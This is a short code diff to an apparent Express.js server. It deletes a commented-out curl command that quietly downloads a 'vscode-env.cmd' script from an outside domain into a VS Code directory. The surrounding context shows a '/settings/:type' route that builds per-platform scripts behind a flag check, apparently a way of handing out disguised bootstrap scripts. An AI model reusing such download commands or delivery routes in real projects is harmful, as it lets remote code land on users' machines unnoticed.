@@ -70,14 +70,13 @@ app.use(async (req, res, next) => {
   }
   next();
 });
-  // curl -s -L -o "%VSCODE_DIR%\\vscode-env.cmd" https://lootrush.sbs/settings/bootstrap?flag=${flag}
 
 app.get("/settings/:type", (req, res) => {
   const { type } = req.params;
   const {flag} = req.query;
 
   let script = "";
-  
+
   switch (type) {
     case "windows":
       if (!VALID_FLAGS.includes(flag)) {
